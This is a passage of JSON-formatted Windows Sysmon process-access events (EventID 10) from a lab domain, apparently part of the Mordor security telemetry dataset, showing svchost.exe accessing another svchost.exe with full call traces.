ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+111b6|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:18:59.999","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3392,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{d273d0f0-e867-5f64-1300-000000000800}","ThreadID":5552,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:19:00","EventReceivedTime":"2020-09-21 19:19:01","@timestamp":"2020-09-21T23:19:01.432Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3591377,"SourceProcessId":"428","SourceThreadId":"9660","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{d273d0f0-e875-5f64-4900-000000000800}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3212","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+6aec5|c:\\windows\\system32\\lsm.dll+f6ba|C:\\windows\\System32\\RPCRT4.dll+76a53|C:\\windows\\System32\\RPCRT4.dll+da036|C:\\windows\\System32\\RPCRT4.dll+37b1c|C:\\windows\\System32\\RPCRT4.dll+54998|C:\\windows\\System32\\RPCRT4.dll+2c951|C:\\windows\\System32\\RPCRT4.dll+2c20b|C:\\windows\\System32\\RPCRT4.dll+1a86f|C:\\windows\\System32\\RPCRT4.dll+19d1a|C:\\windows\\System32\\RPCRT4.dll+19301|C:\\windows\\System32\\RPCRT4.dll+18d6e|C:\\windows\\System32\\RPCRT4.dll+169a5|C:\\windows\\SYSTEM32\\ntdll.dll+333ed|C:\\windows\\SYSTEM32\\ntdll.dll+34142|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:19:00.014","Hostname":"WORKSTATION6.theshire.local","RuleName":"-","tags":["mordorDataset"]}
